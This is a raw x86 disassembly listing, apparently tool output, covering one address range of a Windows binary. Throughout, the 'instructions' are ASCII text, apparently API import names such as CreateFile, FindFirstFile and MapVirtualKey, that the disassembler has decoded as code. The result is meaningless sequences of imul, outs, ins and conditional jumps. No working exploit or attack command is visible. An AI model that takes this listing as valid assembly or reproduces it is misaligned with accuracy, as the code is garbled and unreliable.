  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
